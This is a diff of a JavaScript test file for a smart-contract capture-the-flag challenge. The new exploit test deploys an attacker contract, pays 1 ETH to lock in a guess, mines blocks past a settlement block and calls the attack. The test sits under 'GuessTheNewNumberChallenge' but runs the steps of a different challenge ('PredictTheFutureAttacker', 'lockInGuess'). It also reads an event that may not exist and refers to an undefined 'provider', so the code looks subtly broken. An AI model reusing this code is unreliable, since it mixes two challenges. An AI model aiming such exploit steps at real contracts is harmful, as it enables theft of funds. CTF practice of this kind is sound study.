@@ -24,14 +24,26 @@ describe('GuessTheNewNumberChallenge', () => {
   });
 
   it('exploit', async () => {  
-    
-    const Attacker = await ethers.getContractFactory('GuessTheNewNumberAttacker');  
+    // Deploy attacker contract  
+    const Attacker = await ethers.getContractFactory('PredictTheFutureAttacker');  
     const attackerContract = await Attacker.connect(attacker).deploy();  
-     
-    await attackerContract.attack(target.address, {  
-        value: utils.parseEther('1')  
+
+    // Lock in guess (0) and pay 1 ETH  
+    await attackerContract.lockInGuess(target.address, {  
+      value: utils.parseEther('1'),  
     });  
 
+    // Wait for settlement block to pass  
+    const lockTx = await target.queryFilter(target.filters.lockInGuess());  
+    const settlementBlockNumber = lockTx[0].args.settlementBlockNumber.toNumber();  
+    while ((await provider.getBlockNumber()) < settlementBlockNumber) {  
+      await ethers.provider.send('evm_mine', []);  
+    }  
+
+    // Execute attack  
+    await attackerContract.attack(target.address);  
+
+    // Verify challenge is complete  
     expect(await target.isComplete()).to.equal(true);  
+  });  
 });  
-});
